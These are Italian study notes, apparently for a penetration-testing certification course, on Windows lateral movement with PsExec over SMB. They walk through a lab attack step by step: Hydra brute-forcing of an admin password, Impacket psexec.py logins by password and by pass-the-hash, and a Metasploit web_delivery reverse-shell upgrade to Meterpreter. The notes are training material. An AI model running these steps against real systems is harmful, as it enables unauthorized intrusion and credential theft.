# 04 — Lateral Movement with PsExec

> **Modulo:** Lateral Movement & Pivoting · **Video:** 4/16
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [04_Lateral Movement with PsExec.txt](04_Lateral Movement with PsExec.txt) · [04_Lateral Movement with PsExec.srt](04_Lateral Movement with PsExec.srt)

## Concetti chiave

- **PsExec** = utility SysInternals (Mark Russinovich) per esecuzione comandi remoti su Windows tramite **SMB**.
- Implementazione cross-platform: **Impacket `psexec.py`** in Python (uso primario su Kali).
- Workflow PsExec: **SMB connect → named pipe → create temp service → execute → cleanup**.
- Richiede **credenziali admin** (utente nel gruppo *local Administrators*) — necessarie per creare il servizio.
- Accetta sia **clear-text password** sia **NTLM hash** (Pass-the-Hash).
- Risultato: sessione come **NT AUTHORITY\SYSTEM**.
- È **rumoroso**: lascia traccia logs/event ID, anche se cancella il servizio.

## Spiegazione approfondita

### Come funziona PsExec (4 fasi)
1. **SMB connection** verso il target sulla porta **445** con NTLM auth.
2. **Named pipe creation** sul target per comunicazione client/server.
3. **Temporary service installation**: PsExec uploada un eseguibile sullo share `ADMIN$`, crea e avvia un servizio Windows con privilegi elevati.
4. **Execution & cleanup**: esegue il comando/payload, rimuove il servizio. **Logs ed artefatti restano**.

### Prerequisiti dell'account
- Membership in **local Administrators group** sul target (o `domain admin` in AD).
- Permessi per:
  - Creare/avviare servizi
  - Accedere allo share **IPC$**
  - Read/write su directory di sistema

### SMB e NTLM auth (challenge-response)
1. Client → richiesta connessione.
2. Server → **challenge** (random number).
3. Client → response = challenge cifrato con **NTLM hash** del password.
4. Server → verifica con l'hash salvato.

→ Il client **non invia mai la password in chiaro**, solo l'hash è necessario → **Pass-the-Hash è possibile via SMB**.

NTLMv1 = DES-based (deprecato); NTLMv2 = client+server challenge (più sicuro, default moderno).

### Workflow Impacket `psexec.py`
- Identico al PsExec originale: SMB → named pipe → temp service → exec → cleanup.
- Più pratico da Kali Linux.

## Comandi & strumenti

```bash
# Verifica SMB e dialetti supportati
nmap -p 445 --script smb-protocols <TARGET_IP>

# Brute force SMB v2 con Hydra per utente administrator
hydra -l administrator -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb2://<TARGET_IP>

# Username + password enumeration
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt \
      -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
      -I smb2://<TARGET_IP>

# Impacket PsExec con clear-text password
psexec.py administrator:<password>@<TARGET_IP>

# Impacket PsExec con NTLM hash (Pass-the-Hash) — formato LM:NT
psexec.py -hashes <LM>:<NT> administrator@<TARGET_IP>
```

Tool citati:
- `psexec.py` (Impacket)
- `hydra`
- `nmap` con script `smb-protocols`
- Metasploit `exploit/multi/script/web_delivery` (per upgrade a Meterpreter)

## Esempi pratici

```bash
# 1. Scan iniziale
nmap -sS -sV <TARGET_IP>
nmap -p 445 --script smb-protocols <TARGET_IP>
# → conferma SMBv2, v3.0, v3.0.2, v3.1.1

# 2. Brute force amministratore
hydra -l administrator -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb2://<TARGET_IP>
# → password: superman

# 3. PsExec con password
psexec.py administrator:superman@<TARGET_IP>
# → Output: requesting shares, found writable share ADMIN$, uploading file <random>.exe,
#   creating service <random>, command shell come NT AUTHORITY\SYSTEM

C:\Windows\system32> whoami
nt authority\system
C:\Windows\system32> hostname
WIN-XXXX

# 4. Upgrade a Meterpreter via web_delivery
# (su Kali, in msfconsole)
use exploit/multi/script/web_delivery
set payload windows/meterpreter/reverse_tcp
set LHOST <KALI_IP>
set TARGET 2     # PowerShell
exploit
# Copia la stringa PowerShell generata → incollala nel command prompt di psexec
```

Esempio fallimento atteso (utente non admin):
```bash
psexec.py sysadmin:<password>@<TARGET_IP>
# → fallisce: l'utente non ha privilegi per creare servizi / IPC$
```

## Punti d'attenzione per l'esame eCPPT

- **PsExec richiede un account in local Administrators** — un user qualsiasi non basta. Domanda frequente.
- **Una volta autenticato → NT AUTHORITY\SYSTEM** (privilegio massimo) → no priv esc richiesta.
- **Pass-the-Hash format Impacket**: `LM_HASH:NT_HASH`. Se hai solo NT hash, anteponi 32 zeri per LM: `00000000000000000000000000000000:<NT>`.
- **Porta SMB 445** (139 era NetBIOS legacy).
- **`smb-protocols` Nmap script** = check dei dialetti SMB (v1 → vulnerabili EternalBlue, v2/3 = moderno).
- **PsExec è LOUD**: event ID 7045 (service install), 4624/4672 (logon), files in `ADMIN$`.
- **Distinzione tool**: PsExec.exe (Windows native, SysInternals) ≠ `psexec.py` (Impacket Python) — funzionalità equivalente.
- Alternativa silenziosa = SMBExec (no servizio classico) o WMIExec (no SMB share write).

## Collegamenti con altri video

- Precedente: [[03_Windows Lateral Movement Techniques]] — overview teorico.
- Prossimo: [[05_Lateral Movement with SMBExec]] — variante più silenziosa.
- Tool catch-all: [[06_Lateral Movement with CrackMapExec]]
- PTH approfondito: [[09_Pass-the-Hash with Metasploit]] · [[010_Pass-the-Hash with WMIExec]]
